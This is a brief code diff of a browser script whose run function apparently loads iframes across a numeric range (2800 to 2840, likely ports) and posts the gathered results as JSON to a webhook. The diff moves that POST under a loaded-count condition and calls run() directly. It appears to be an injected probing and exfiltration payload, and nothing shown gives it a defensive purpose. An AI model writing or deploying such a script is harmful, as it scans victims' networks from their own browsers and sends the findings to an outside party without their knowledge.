@@ -25,18 +25,16 @@ function run(a = 2800, b = 2840) {
 
             loadedCount++;
 
-
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(results)
-            });
-        };
-
+            if (loadedCount !== b - a){
+                fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(results)
+                });
+            };
         document.documentElement.appendChild(iframe);
     }
-    return loadedCount;
 }
 
-console.log(run());
+run();
 </script>
